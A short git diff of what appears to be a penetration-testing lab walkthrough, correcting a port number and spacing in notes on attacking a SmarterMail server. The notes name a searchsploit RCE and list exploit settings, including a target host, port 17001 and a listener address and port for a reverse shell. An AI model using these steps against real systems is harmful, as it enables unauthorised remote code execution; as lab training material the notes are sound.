@@ -24,7 +24,7 @@ PORT      STATE SERVICE       VERSION
 49669/tcp open  unknown
 ```
 
-port 9999 shows smartermail. Searchsploit smartermail to show an RCE.
+port 9998 shows smartermail. Searchsploit smartermail to show an RCE.
 Input 
 ```
 HOST='192.168.245.65'
@@ -33,7 +33,7 @@ LHOST='192.168.45.216'
 LPORT=4444
 ```
 but exploit does not work.
-Google `17001/tcp open  remoting      MS .NET Remoting services` to find out that it is the port for smartermail
+Google `17001/tcp open  remoting  MS .NET Remoting services` to find out that it is the port for smartermail
 ```
 HOST='192.168.245.65'
 PORT=17001
